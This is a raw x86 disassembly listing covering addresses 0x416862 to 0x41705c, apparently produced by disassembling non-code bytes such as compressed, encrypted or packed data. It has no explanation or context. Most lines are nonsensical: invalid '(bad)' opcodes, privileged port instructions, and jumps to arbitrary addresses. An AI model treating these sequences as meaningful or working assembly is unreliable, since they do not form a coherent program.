  416862:	ins    BYTE PTR es:[edi],dx
  416863:	aam    0x90
  416865:	es daa 
  416867:	and    edx,0xefdfea8a
  41686d:	adc    al,0x50
  41686f:	push   ss
  416870:	mov    ds:0xfbf8cc94,al
  416875:	jb     0x41685e
  416877:	cmp    eax,0x7eed3897
  41687c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41687d:	xlat   BYTE PTR ds:[ebx]
  41687e:	test   BYTE PTR [ecx],al
  416880:	mov    al,ds:0xc544b3bc
  416885:	fstp   st(3)
  416887:	aad    0x87
  416889:	out    0xe1,eax
  41688b:	mov    ch,0xa1
  41688d:	add    BYTE PTR [ebx-0x44],0x92
  416891:	sbb    ah,BYTE PTR [edi+0x6d]
  416894:	icebp  
  416895:	(bad)  
  416897:	std    
  416898:	aaa    
  416899:	stc    
  41689a:	icebp  
  41689b:	test   eax,0xc78b069f
  4168a0:	stc    
  4168a1:	fidivr WORD PTR [edx]
  4168a3:	or     esi,DWORD PTR [ebx-0x2d]
  4168a6:	dec    ebx
  4168a7:	out    0x20,al
  4168a9:	sub    dl,BYTE PTR ds:0xfedfadee
  4168af:	add    al,0x2a
  4168b1:	jno    0x416886
  4168b3:	jmp    0x416854
  4168b5:	pop    ebx
  4168b6:	into   
  4168b7:	jmp    0x3cc514f4
  4168bc:	dec    edx
  4168bd:	cld    
  4168be:	jmp    DWORD PTR [eax-0x1ef24397]
  4168c4:	fidiv  DWORD PTR gs:[esi-0x74]
  4168c8:	jns    0x7cadc448
  4168ce:	mov    ebx,ebp
  4168d0:	test   DWORD PTR [ebp-0x6f],edx
  4168d3:	hlt    
  4168d4:	repnz cwde 
  4168d6:	inc    esp
  4168d7:	add    eax,ebx
  4168d9:	je     0x4168e7
  4168db:	call   0xe16d479c
  4168e0:	lods   eax,DWORD PTR fs:[esi]
  4168e2:	das    
  4168e3:	ret    
  4168e4:	mov    ds:0x3a9154df,al
  4168e9:	std    
  4168ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168eb:	mov    bh,0x6e
  4168ed:	into   
  4168ee:	(bad)  
  4168ef:	and    al,bl
  4168f1:	jnp    0x4168f1
  4168f3:	ret    0x1c04
  4168f6:	aam    0x9a
  4168f8:	jno    0x4168c5
  4168fa:	cmp    eax,0xff525416
  4168ff:	imul   ecx,edi,0xffffffaa
  416902:	xor    DWORD PTR [ebx-0x14128948],ebx
  416908:	push   DWORD PTR [ebx-0x3a3b3915]
  41690e:	aad    0x43
  416910:	rcr    DWORD PTR [eax+0xa9dcf7a],cl
  416916:	xor    esi,esp
  416918:	ss cmc 
  41691a:	out    dx,al
  41691b:	cmp    edx,DWORD PTR [eax-0x5d]
  41691e:	and    esi,0x51
  416921:	lods   eax,DWORD PTR ds:[esi]
  416922:	cwde   
  416923:	sbb    ch,BYTE PTR [edi-0x492b58cf]
  416929:	push   ebp
  41692a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41692b:	cmp    DWORD PTR [ebx-0x2d214f50],esi
  416931:	in     al,0x20
  416933:	ja     0x4168d7
  416935:	outs   dx,DWORD PTR ds:[esi]
  416936:	outs   dx,BYTE PTR ds:[esi]
  416937:	repz push ecx
  416939:	in     al,0x58
  41693b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41693c:	ja     0x416940
  41693e:	xchg   ebp,eax
  41693f:	mov    ds:0xf6376a9a,eax
  416944:	and    ecx,DWORD PTR gs:[ecx+eiz*2+0x7afb96fb]
  41694c:	push   0x76
  41694e:	mov    cl,0xaf
  416950:	lahf   
  416951:	add    bl,BYTE PTR [edx+0x19019828]
  416957:	mov    cl,0xab
  416959:	xchg   DWORD PTR [edi-0x30],eax
  41695c:	jl     0x4169c7
  41695e:	ret    
  41695f:	sbb    esi,DWORD PTR [ecx-0x2dd05d07]
  416965:	popf   
  416966:	mov    bh,ch
  416968:	repnz mov bh,0xfe
  41696b:	add    al,0x1d
  41696d:	mov    esi,0x536eda46
  416972:	out    0x19,al
  416974:	sbb    ah,BYTE PTR [edi]
  416976:	sti    
  416977:	jp     0x4169c1
  416979:	push   edx
  41697a:	in     eax,dx
  41697b:	or     dl,BYTE PTR [eax-0x41575adc]
  416981:	or     BYTE PTR [ecx-0x4c111506],dh
  416987:	push   edx
  416988:	lods   al,BYTE PTR ds:[esi]
  416989:	mov    BYTE PTR [ebp+0x345deef2],al
  41698f:	push   esp
  416990:	daa    
  416991:	int    0x64
  416993:	ins    BYTE PTR es:[edi],dx
  416994:	mov    esp,DWORD PTR [esi]
  416996:	das    
  416997:	sbb    ebx,ebx
  416999:	popf   
  41699a:	pop    ds
  41699b:	call   0x83f3:0x2d85a543
  4169a2:	(bad)  
  4169a3:	xchg   ebx,eax
  4169a4:	xor    eax,0xf81e1d75
  4169a9:	and    al,0x6b
  4169ab:	cdq    
  4169ac:	clc    
  4169ad:	adc    bl,BYTE PTR [edi+0x645bf2e5]
  4169b3:	sub    ecx,ebx
  4169b5:	mov    esi,0x3fbe2c4
  4169ba:	xchg   edx,eax
  4169bb:	es loopne 0x4169d3
  4169be:	xor    al,0xc3
  4169c0:	sub    al,0x50
  4169c2:	pop    esp
  4169c3:	push   0x3b3e16c1
  4169c8:	ins    BYTE PTR es:[edi],dx
  4169c9:	fild   WORD PTR [ebx-0x24fde87d]
  4169cf:	les    ecx,FWORD PTR [esi]
  4169d1:	xchg   BYTE PTR [esi],dh
  4169d3:	out    0x45,al
  4169d5:	cmp    BYTE PTR [ebp-0x3f9c0e7f],cl
  4169db:	inc    BYTE PTR [edi+eax*4-0x4d]
  4169df:	add    eax,0xc9d6842e
  4169e4:	(bad)  
  4169e6:	ja     0x416a24
  4169e8:	mov    BYTE PTR [ecx-0x4a41aa42],ch
  4169ee:	mov    esi,0x898cb888
  4169f3:	jl     0x416a21
  4169f5:	daa    
  4169f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169f7:	sti    
  4169f8:	ins    DWORD PTR es:[edi],dx
  4169f9:	bound  esp,QWORD PTR [edi+0x10]
  4169fc:	mov    ah,0x30
  4169fe:	sbb    edi,ecx
  416a00:	ret    0x4592
  416a03:	and    esp,esp
  416a05:	jmp    0x7963:0xe549313a
  416a0c:	daa    
  416a0d:	imul   ecx,edx,0xffffffbf
  416a10:	lock gs adc edi,ecx
  416a14:	adc    al,0x33
  416a16:	inc    esp
  416a17:	push   es
  416a18:	mov    ch,0x61
  416a1a:	stc    
  416a1b:	ins    DWORD PTR es:[edi],dx
  416a1c:	dec    ebp
  416a1d:	sbb    bl,BYTE PTR [eax]
  416a1f:	retf   0xdf94
  416a22:	inc    esi
  416a23:	test   al,0xdb
  416a25:	iret   
  416a26:	loopne 0x4169ad
  416a28:	mov    cl,0x30
  416a2a:	pushf  
  416a2b:	aas    
  416a2c:	xor    cl,BYTE PTR [eax]
  416a2e:	fwait
  416a2f:	push   esp
  416a30:	shr    BYTE PTR [esp+0x6],0xef
  416a35:	xchg   ecx,eax
  416a36:	gs xchg ecx,eax
  416a38:	and    ebx,ecx
  416a3a:	enter  0xdfae,0xdc
  416a3e:	test   al,0x40
  416a40:	adc    ch,BYTE PTR [edx]
  416a42:	mov    esp,esp
  416a44:	fidiv  DWORD PTR [edi-0x72]
  416a47:	(bad)  fs:[eax]
  416a4a:	push   esi
  416a4b:	aam    0xa0
  416a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a4e:	hlt    
  416a4f:	addr16 shl ch,0xfc
  416a53:	loop   0x416a39
  416a55:	loope  0x416a98
  416a57:	or     BYTE PTR [edi-0x4b],bh
  416a5a:	sub    eax,0x74d1a4fd
  416a5f:	xchg   ecx,eax
  416a60:	sub    BYTE PTR [edi],al
  416a62:	test   DWORD PTR [ecx+0x3f],edi
  416a65:	int3   
  416a66:	repnz xor al,0xc4
  416a69:	lea    esi,[eax]
  416a6b:	popf   
  416a6c:	sbb    ebx,DWORD PTR [edi-0x341afef]
  416a72:	pop    ecx
  416a73:	lods   eax,DWORD PTR ds:[esi]
  416a74:	jmp    0x6efd8c21
  416a79:	xor    eax,0x1e54d812
  416a7e:	cmp    al,0x87
  416a80:	adc    edx,DWORD PTR [edi+0x11644a71]
  416a86:	xor    DWORD PTR [edx+eax*4],ebp
  416a89:	fwait
  416a8a:	(bad)  
  416a8b:	push   eax
  416a8c:	mov    ebp,ds
  416a8e:	sbb    BYTE PTR [ebx+0x6649e693],0x48
  416a95:	fiadd  WORD PTR [ebp-0x1f]
  416a98:	pusha  
  416a99:	sbb    edx,DWORD PTR ds:0x74bbc4d8
  416a9f:	mov    ah,0xc7
  416aa1:	test   eax,0x607f69c5
  416aa6:	adc    ecx,DWORD PTR [ecx+0x79]
  416aa9:	xlat   BYTE PTR ds:[ebx]
  416aaa:	(bad)  
  416aab:	mov    edi,0x762fa8f8
  416ab0:	or     edi,DWORD PTR [edx+0x401ff135]
  416ab6:	adc    eax,0x139b940e
  416abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416abc:	lods   eax,DWORD PTR ds:[esi]
  416abd:	pusha  
  416abe:	and    eax,0x9099703f
  416ac3:	retf   
  416ac4:	shr    BYTE PTR [bx+si-0x618e],0xbb
  416aca:	or     BYTE PTR [ecx-0x5232427],ch
  416ad0:	enter  0x1fd0,0x10
  416ad4:	ficomp DWORD PTR [ebx]
  416ad6:	mov    esi,0xb47ded85
  416adb:	(bad)  
  416add:	cmc    
  416ade:	jbe    0x416b16
  416ae0:	pop    ebx
  416ae1:	lods   eax,DWORD PTR ds:[esi]
  416ae2:	cmp    cl,BYTE PTR [ecx]
  416ae4:	popf   
  416ae5:	shl    DWORD PTR [ecx+0x1540a0ab],cl
  416aeb:	popf   
  416aec:	repnz add eax,0x8a3172f2
  416af2:	fld    QWORD PTR ss:[ebx]
  416af5:	out    dx,eax
  416af6:	lods   eax,DWORD PTR ds:[esi]
  416af7:	fld    QWORD PTR [esi+0x3405948a]
  416afd:	and    eax,eax
  416aff:	xchg   edx,eax
  416b00:	gs repz cmc 
  416b03:	and    eax,0x6c588dd5
  416b08:	sahf   
  416b09:	jmp    0x416ab2
  416b0b:	or     ecx,DWORD PTR [edi]
  416b0d:	jno    0x416ac0
  416b0f:	jb     0x416b4f
  416b11:	arpl   WORD PTR [esi+0x64],sp
  416b14:	xchg   edx,eax
  416b15:	jbe    0x416b07
  416b17:	jecxz  0x416abb
  416b19:	inc    esp
  416b1a:	jl     0x416aab
  416b1c:	mov    al,0x9a
  416b1e:	test   eax,0xe21947a0
  416b23:	mov    bh,0xd3
  416b25:	je     0x416acd
  416b27:	push   ecx
  416b28:	jg     0x416ab2
  416b2a:	xor    DWORD PTR [edi-0x1c],edi
  416b2d:	retf   
  416b2e:	cmp    al,0x50
  416b30:	add    esi,eax
  416b32:	les    eax,FWORD PTR [esi+0x1e]
  416b35:	inc    esp
  416b36:	mov    esp,0x3f8ab46c
  416b3b:	inc    ecx
  416b3c:	in     al,0x50
  416b3e:	jg     0x416ad6
  416b40:	out    dx,al
  416b41:	add    esi,esp
  416b43:	(bad)  
  416b44:	mov    ebx,DWORD PTR [edx+0x3fe6e72]
  416b4a:	mov    ebx,0x7db06d56
  416b4f:	xchg   DWORD PTR [ebx+0x50],eax
  416b52:	cdq    
  416b53:	test   ah,0x38
  416b56:	xchg   DWORD PTR [ecx+0x111fa1f5],eax
  416b5c:	mov    DWORD PTR [ecx],esp
  416b5e:	outs   dx,BYTE PTR ds:[esi]
  416b5f:	mov    al,0xf4
  416b61:	sub    BYTE PTR [ecx-0x30b4da05],0xce
  416b68:	add    BYTE PTR [ebx+edi*1],al
  416b6b:	sbb    DWORD PTR [ebp+0x5af4c5d1],ecx
  416b71:	jmp    DWORD PTR [ebp-0x760aeb2e]
  416b77:	fs ins DWORD PTR es:[edi],dx
  416b79:	xchg   ebp,eax
  416b7a:	repz imul edx,DWORD PTR [esi-0x3618df9c],0xb39416af
  416b85:	in     al,0x4b
  416b87:	ins    DWORD PTR es:[edi],dx
  416b88:	loope  0x416bab
  416b8a:	add    eax,0x5b7aaf53
  416b8f:	xchg   BYTE PTR [edx-0x509caeab],dh
  416b95:	mov    bh,0x3d
  416b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b98:	and    DWORD PTR [ecx+0xb],ebx
  416b9b:	retf   
  416b9c:	mul    DWORD PTR [esi+0x3c]
  416b9f:	mov    edx,0x453ec9c7
  416ba4:	or     bh,dl
  416ba6:	push   edi
  416ba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ba8:	call   0x5a37:0x5cdb7a2b
  416baf:	imul   ebx,DWORD PTR [ebp-0x7a8de256],0x7124f5d6
  416bb9:	push   0xfffffff1
  416bbb:	ss xchg ecx,eax
  416bbd:	aam    0xf0
  416bbf:	xor    DWORD PTR [edx],ebx
  416bc1:	fidivr DWORD PTR ss:[ecx]
  416bc4:	xor    al,0xea
  416bc6:	jne    0x416bc8
  416bc8:	into   
  416bc9:	mov    ah,0x1
  416bcb:	setge  bl
  416bce:	push   esi
  416bcf:	push   ebp
  416bd0:	jp     0x416b82
  416bd2:	and    ch,BYTE PTR [ecx+esi*8-0x5ef508c1]
  416bd9:	popa   
  416bda:	rol    DWORD PTR [eax+esi*1-0x2e],cl
  416bde:	ins    DWORD PTR es:[edi],dx
  416bdf:	xchg   ch,cl
  416be1:	fldpi  
  416be3:	adc    DWORD PTR [edi+0x5b],eax
  416be6:	fild   DWORD PTR [eax+0x7a72a534]
  416bec:	hlt    
  416bed:	xor    esp,DWORD PTR [edx+ebp*2-0x13]
  416bf1:	inc    ecx
  416bf2:	iret   
  416bf3:	pop    edi
  416bf4:	sti    
  416bf5:	imul   esi,DWORD PTR [ecx],0x45e6df7a
  416bfb:	enter  0x6656,0xcd
  416bff:	pop    esi
  416c00:	ss xchg ebx,eax
  416c02:	les    ebx,FWORD PTR [ebp+0x55539bb5]
  416c08:	mov    bh,0x83
  416c0a:	pop    ebx
  416c0b:	and    bh,cl
  416c0d:	jmp    0x416c78
  416c0f:	cmp    al,BYTE PTR [esi-0xe88e615]
  416c15:	mov    dl,0x23
  416c17:	or     al,0xce
  416c19:	ret    
  416c1a:	jae    0x416c60
  416c1c:	je     0x416c1c
  416c1e:	into   
  416c1f:	in     eax,0xd5
  416c21:	out    0xc0,al
  416c23:	pushf  
  416c24:	repz jmp 0x8f9c:0x9a97fb43
  416c2c:	sub    DWORD PTR [edx-0x2bc35804],esi
  416c32:	add    ebp,DWORD PTR [edi-0x39]
  416c35:	lods   al,BYTE PTR ds:[esi]
  416c36:	jmp    0x7ab9c840
  416c3b:	pop    edi
  416c3c:	lods   al,BYTE PTR ds:[esi]
  416c3d:	fmul   DWORD PTR es:[ecx+0x3bfda6f9]
  416c44:	or     BYTE PTR [esi+0x753f028f],bl
  416c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c4b:	add    BYTE PTR [ebp+0x636477b6],0x15
  416c52:	icebp  
  416c53:	push   ebx
  416c54:	call   0xd456b33f
  416c59:	mov    ?,WORD PTR [eax]
  416c5b:	mov    cl,BYTE PTR [ebp+0xc]
  416c5e:	int    0xb9
  416c60:	call   0x28a7:0xc6d53b04
  416c67:	dec    ecx
  416c68:	out    dx,al
  416c69:	xchg   edi,eax
  416c6a:	sbb    al,0xd5
  416c6c:	mov    eax,ds:0x15e4c2e5
  416c71:	shl    BYTE PTR [ebx+ecx*1],cl
  416c74:	mov    cl,0xee
  416c76:	addr16 jl 0x416ced
  416c79:	sbb    esi,esp
  416c7b:	adc    al,0xc
  416c7d:	fwait
  416c7e:	div    DWORD PTR [ebx+0x554f54dc]
  416c84:	sub    eax,0xa6d9aa53
  416c89:	mov    ch,0xa9
  416c8b:	add    edi,eax
  416c8d:	dec    esi
  416c8e:	sbb    ecx,DWORD PTR [ebx+0x79783436]
  416c94:	xor    al,0xd
  416c96:	loope  0x416c34
  416c98:	(bad)  
  416c9a:	je     0x416cca
  416c9c:	mov    cl,dl
  416c9e:	sub    eax,0x7e6b01d8
  416ca3:	leave  
  416ca4:	mov    eax,ds:0xc16278d
  416ca9:	mov    eax,0x1795d7d7
  416cae:	ja     0x416ca7
  416cb0:	in     eax,dx
  416cb1:	lds    esi,FWORD PTR [eax+ecx*1]
  416cb4:	pop    es
  416cb5:	sbb    ebx,ebp
  416cb7:	mov    ax,ds:0xc7a13460
  416cbd:	fsubrp st(5),st
  416cbf:	call   0xabf88f11
  416cc4:	mov    edi,eax
  416cc6:	or     al,0xff
  416cc8:	mov    dh,BYTE PTR [ebx+ecx*1-0x2d]
  416ccc:	shr    ch,0x99
  416ccf:	rcr    BYTE PTR [ebp-0x4e96e9e8],cl
  416cd5:	push   edi
  416cd6:	add    al,0xa2
  416cd8:	ins    DWORD PTR es:[edi],dx
  416cd9:	fcomp  DWORD PTR [edx+0x30a5abff]
  416cdf:	fmulp  st(1),st
  416ce1:	add    al,0xe9
  416ce3:	mov    fs,edi
  416ce5:	outs   dx,BYTE PTR ds:[esi]
  416ce6:	and    ch,bh
  416ce8:	stos   BYTE PTR es:[edi],al
  416ce9:	mov    dl,0xec
  416ceb:	xor    eax,DWORD PTR [esi+edx*8+0x58c26e8f]
  416cf2:	dec    esp
  416cf3:	cmp    ebx,DWORD PTR [edi+0x30a65230]
  416cf9:	jmp    0x9e99ba59
  416cfe:	mov    ah,0x3c
  416d00:	dec    eax
  416d01:	jo     0x416d4a
  416d03:	(bad)  
  416d05:	inc    eax
  416d06:	rcl    DWORD PTR [ebx+0x1501521b],1
  416d0c:	lds    ecx,FWORD PTR [ecx]
  416d0e:	add    esp,DWORD PTR [ebx-0x43]
  416d11:	mov    al,BYTE PTR [ecx-0xf1e63c3]
  416d17:	sub    ebx,DWORD PTR [ebx]
  416d19:	or     ch,BYTE PTR [edi-0x7c]
  416d1c:	push   esi
  416d1d:	xchg   DWORD PTR [eax+0xa8c2866],ecx
  416d23:	xor    bh,BYTE PTR [ebx+ecx*1-0x43]
  416d27:	jl     0x416cc4
  416d29:	jmp    0x416d81
  416d2b:	jmp    0x416cf6
  416d2d:	xchg   BYTE PTR [ebx+0x6f],al
  416d30:	imul   edx,edx,0x702b8d61
  416d36:	mov    al,BYTE PTR [esi+ebx*8+0x7c]
  416d3a:	mov    esi,0x13bf0e75
  416d3f:	pop    ds
  416d40:	add    eax,0x7faad4fc
  416d45:	hlt    
  416d46:	cmp    ecx,ebx
  416d48:	and    ebx,DWORD PTR [edi-0x1a532021]
  416d4e:	jge    0x416da4
  416d50:	inc    ecx
  416d51:	jecxz  0x416d4a
  416d53:	imul   eax,DWORD PTR [edx+0x37da34d3],0xffffffdd
  416d5a:	ret    
  416d5b:	sub    al,0xf2
  416d5d:	(bad)  
  416d5e:	xor    ecx,edx
  416d60:	sbb    al,0xee
  416d62:	push   ss
  416d63:	cmp    al,dl
  416d65:	cmp    ebx,edx
  416d67:	not    DWORD PTR ds:0xabf21c58
  416d6d:	mov    ebx,0x28c5be08
  416d72:	aas    
  416d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d74:	fst    QWORD PTR [ecx-0x63]
  416d77:	iret   
  416d78:	dec    ebp
  416d79:	aas    
  416d7a:	jnp    0x416d2f
  416d7c:	dec    eax
  416d7d:	stc    
  416d7e:	mov    edi,0x92efe011
  416d83:	add    DWORD PTR [esp+edi*4+0x1cb853af],ebp
  416d8a:	loopne 0x416d68
  416d8c:	push   0x7c1d6638
  416d91:	adc    BYTE PTR [ecx+0x1f],cl
  416d94:	and    BYTE PTR [ecx+0x5e6214bf],0x2d
  416d9b:	outs   dx,BYTE PTR ds:[esi]
  416d9c:	or     eax,0x884a0e14
  416da1:	and    DWORD PTR [ebx+0x65],0x3e
  416da5:	scas   eax,DWORD PTR es:[edi]
  416da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416da7:	jns    0x416e24
  416da9:	call   0x4d3d:0xbee3def3
  416db0:	in     al,dx
  416db1:	xor    edi,DWORD PTR [ebp+0xa]
  416db4:	aam    0x34
  416db6:	add    al,0xf0
  416db8:	mov    ch,0xce
  416dba:	loope  0x416d8b
  416dbc:	xchg   edi,eax
  416dbd:	adc    esp,eax
  416dbf:	mov    eax,ds:0xb6cbb715
  416dc4:	pop    esp
  416dc5:	(bad)  
  416dc7:	pop    es
  416dc8:	cwde   
  416dc9:	in     al,0xa3
  416dcb:	pop    ds
  416dcc:	les    edi,FWORD PTR [ebx-0x59]
  416dcf:	loopne 0x416e16
  416dd1:	dec    ebx
  416dd2:	mov    ah,0x1c
  416dd4:	lea    esi,[edx-0x1]
  416dd7:	mov    cs,WORD PTR [esi+ebp*4]
  416dda:	xchg   edi,eax
  416ddb:	(bad)  
  416ddc:	fmul   QWORD PTR [ebx+0x5]
  416ddf:	ret    
  416de0:	ret    
  416de1:	add    ch,bl
  416de3:	les    esp,FWORD PTR [eax+0xf860549]
  416de9:	ficom  WORD PTR [eax]
  416deb:	jmp    0xfe4e:0xdee82305
  416df2:	leave  
  416df3:	add    DWORD PTR [esi+0x7e],esp
  416df6:	xor    al,0xa6
  416df8:	in     eax,dx
  416df9:	cld    
  416dfa:	test   BYTE PTR [edi+eax*8-0x80],al
  416dfe:	or     ah,BYTE PTR [edx-0x41c22c0f]
  416e04:	pushf  
  416e05:	cwde   
  416e06:	retf   
  416e07:	jbe    0x416e36
  416e09:	inc    esi
  416e0a:	push   0x44
  416e0c:	fadd   QWORD PTR [esi+0x2338161c]
  416e12:	inc    ecx
  416e13:	cmp    BYTE PTR ds:0x16392cf2,0x7a
  416e1a:	ins    BYTE PTR es:[edi],dx
  416e1b:	in     al,dx
  416e1c:	retf   0x40c7
  416e1f:	lods   eax,DWORD PTR ds:[esi]
  416e20:	inc    esi
  416e21:	fsubr  QWORD PTR [esi-0x59ca385]
  416e27:	in     al,dx
  416e28:	inc    esp
  416e29:	sbb    eax,0x6665857e
  416e2e:	or     ebx,DWORD PTR [eax+ecx*1]
  416e31:	xor    al,0x55
  416e33:	ss inc ecx
  416e35:	shl    esi,0x8f
  416e38:	xchg   ecx,eax
  416e39:	(bad)  
  416e3b:	add    DWORD PTR [esi+ebp*2],ecx
  416e3e:	jae    0x416e75
  416e40:	lahf   
  416e41:	add    DWORD PTR [ecx-0x69175f5d],0xf28fbf27
  416e4b:	xchg   ebp,edi
  416e4d:	aas    
  416e4e:	push   esi
  416e4f:	mov    BYTE PTR [eax-0x31],cl
  416e52:	push   edx
  416e53:	fisubr DWORD PTR [esi+0x7f993a3c]
  416e59:	or     esp,DWORD PTR [ebp+0x4e]
  416e5c:	lock icebp 
  416e5e:	add    edi,DWORD PTR [eax-0x2f602854]
  416e64:	fisubr DWORD PTR [eax+eiz*8-0x41e372af]
  416e6b:	push   edx
  416e6c:	xchg   esp,eax
  416e6d:	cmc    
  416e6e:	push   DWORD PTR [ebx-0x2319f521]
  416e74:	sub    al,0x3f
  416e76:	dec    ecx
  416e77:	or     DWORD PTR [edi-0x1a],ebx
  416e7a:	ins    BYTE PTR es:[edi],dx
  416e7b:	jno    0x416e2a
  416e7d:	adc    al,dh
  416e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e80:	mov    WORD PTR [eax+0x24],ss
  416e83:	int3   
  416e84:	repnz cdq 
  416e86:	xchg   ecx,eax
  416e87:	cwde   
  416e88:	retf   0x6a77
  416e8b:	sbb    BYTE PTR [eax+ebx*4+0x4ec2db1f],ah
  416e92:	in     eax,0x47
  416e94:	sbb    al,0xbb
  416e96:	daa    
  416e97:	xchg   edx,eax
  416e98:	cmp    al,0xdd
  416e9a:	xchg   ecx,eax
  416e9b:	test   al,0x92
  416e9d:	(bad)  [ecx+esi*8+0x148ac512]
  416ea4:	or     dl,BYTE PTR [eax+0x26bbf9d5]
  416eaa:	rol    esp,1
  416eac:	mov    eax,ds:0xd0468487
  416eb1:	mov    edx,0x70371b36
  416eb6:	retf   
  416eb7:	mov    ecx,0x87881eab
  416ebc:	mov    DWORD PTR [ebx+0x35],edx
  416ebf:	aad    0x5
  416ec1:	call   0x51602aa4
  416ec6:	repnz mov edi,0x9ecd6a46
  416ecc:	xor    edx,DWORD PTR es:[eax+0x27]
  416ed0:	mov    ds:0x99ddd94d,eax
  416ed5:	gs aas 
  416ed7:	test   DWORD PTR [ecx-0x182a1594],edi
  416edd:	sub    bl,bl
  416edf:	jne    0x416ed0
  416ee1:	sbb    al,0x2
  416ee3:	sub    bl,bh
  416ee5:	mov    BYTE PTR [ecx],al
  416ee7:	call   FWORD PTR [ebx+0x5599510f]
  416eed:	xchg   esi,eax
  416eee:	icebp  
  416eef:	pusha  
  416ef0:	and    DWORD PTR [ecx+0x31],0x4f
  416ef4:	mov    al,ds:0xa1b73f0d
  416ef9:	ret    
  416efa:	mov    ah,0xa4
  416efc:	jb     0x416e8f
  416efe:	shr    eax,0x35
  416f01:	push   0xffffffbb
  416f03:	(bad)  
  416f04:	mov    ebp,0xde56fb7
  416f0a:	ror    bl,1
  416f0c:	dec    esp
  416f0d:	and    DWORD PTR [edx+0xc],eax
  416f10:	out    0x8,eax
  416f12:	jge    0x416efb
  416f14:	shl    DWORD PTR [ebx],cl
  416f16:	dec    edx
  416f17:	and    bh,BYTE PTR [edx]
  416f19:	(bad)  
  416f1a:	test   al,0x33
  416f1c:	pop    es
  416f1d:	cmp    al,dl
  416f1f:	xor    ch,BYTE PTR [edx-0x20cd56d5]
  416f25:	mov    eax,ds:0x469a381
  416f2a:	sub    eax,0xe0c8609c
  416f2f:	mov    WORD PTR [eax+ecx*4+0x6d3d53de],cs
  416f36:	es int3 
  416f38:	nop
  416f39:	push   edx
  416f3a:	hlt    
  416f3b:	test   al,0xda
  416f3d:	add    BYTE PTR [edx-0x16],bl
  416f40:	out    0x2,eax
  416f42:	and    BYTE PTR [edi-0x1a],dl
  416f45:	or     BYTE PTR [eax],ah
  416f47:	xchg   edx,eax
  416f48:	arpl   WORD PTR [ebp-0x6],dx
  416f4b:	ficom  WORD PTR [ecx]
  416f4d:	add    al,0x73
  416f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f50:	jmp    0x64d0ce28
  416f55:	add    esi,eax
  416f57:	(bad)  
  416f58:	(bad)  
  416f59:	mov    eax,0x17587bc2
  416f5e:	je     0x416f69
  416f60:	lahf   
  416f61:	xor    al,0x24
  416f63:	dec    ebp
  416f64:	add    al,BYTE PTR [eax]
  416f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f67:	sub    dh,BYTE PTR [edi+edi*1-0x7e1025af]
  416f6e:	sub    BYTE PTR ds:0xf755fa37,0x2c
  416f75:	fmul   QWORD PTR [edi]
  416f77:	xchg   DWORD PTR [ecx-0x245d5c06],edx
  416f7d:	adc    BYTE PTR [ecx],0xde
  416f80:	and    ebp,eax
  416f82:	or     bl,BYTE PTR [eax+0x35f42d88]
  416f88:	push   ebx
  416f89:	jmp    0x416fa8
  416f8b:	mov    ebx,0x728b889f
  416f90:	pop    ebx
  416f91:	jns    0x416fb9
  416f93:	fst    QWORD PTR [ecx+edi*2+0x673ad15]
  416f9a:	loopne 0x416fff
  416f9c:	mov    eax,ds:0xe74c94de
  416fa1:	push   edi
  416fa2:	aad    0x7
  416fa4:	xchg   al,ah
  416fa6:	imul   ebx,DWORD PTR [edx],0xe128dfd8
  416fac:	and    ecx,DWORD PTR [ebp-0x7]
  416faf:	fisub  DWORD PTR [bx+0x35c5]
  416fb4:	rol    DWORD PTR [edx+0x3b],cl
  416fb7:	mov    ebx,0x36acb9f8
  416fbc:	cmp    eax,0x788bea
  416fc1:	cmp    ecx,DWORD PTR [ebx+0x2e685857]
  416fc7:	dec    edi
  416fc8:	mov    dh,0xa4
  416fca:	and    eax,0xdf691d7b
  416fcf:	add    DWORD PTR [ebx],edi
  416fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fd2:	or     al,BYTE PTR [ecx+0x26bddcfc]
  416fd8:	je     0x416ff8
  416fda:	fcmovnbe st,st(1)
  416fdc:	popa   
  416fdd:	cdq    
  416fde:	es push esp
  416fe0:	iret   
  416fe1:	push   es
  416fe2:	repnz cmp dl,BYTE PTR [ecx-0x16aadd4e]
  416fe9:	cli    
  416fea:	into   
  416feb:	cs (bad) 
  416fed:	les    ecx,FWORD PTR [eax-0x65]
  416ff0:	jb     0x416f9f
  416ff2:	pop    ebp
  416ff3:	pusha  
  416ff4:	(bad)  
  416ff5:	mov    ?,eax
  416ff7:	test   al,0x68
  416ff9:	imul   ecx,DWORD PTR [edi+0x1b765983],0x10d06add
  417003:	jmp    0x48e059a1
  417008:	(bad)  
  417009:	es dec ebp
  41700b:	in     eax,dx
  41700c:	or     al,0x43
  41700e:	mov    dh,0xf4
  417010:	jbe    0x417041
  417012:	mov    ah,BYTE PTR [ebx+edi*1+0x712e1a17]
  417019:	mov    eax,ds:0x8e970a0f
  41701e:	jbe    0x417091
  417020:	in     eax,dx
  417021:	mov    bl,0x3f
  417023:	test   BYTE PTR [edi+eiz*2+0x6c5a4469],bh
  41702a:	mov    dl,0xef
  41702c:	repnz mov ecx,0xd5ac86e0
  417032:	icebp  
  417033:	mov    esi,0x4105e925
  417038:	cmp    bl,bl
  41703a:	ret    
  41703b:	aam    0xf2
  41703d:	bnd ret 
  41703f:	aas    
  417040:	lahf   
  417041:	test   eax,0xcca18940
  417046:	xor    eax,0xb3b9a045
  41704b:	(bad)  
  41704c:	scas   al,BYTE PTR es:[edi]
  41704d:	xor    esi,DWORD PTR [ebx+0x7f9e4f90]
  417053:	or     al,0xe1
  417055:	xchg   esi,eax
  417056:	rcr    DWORD PTR ds:0xc6c4bd15,1
  41705c:	pop    edx
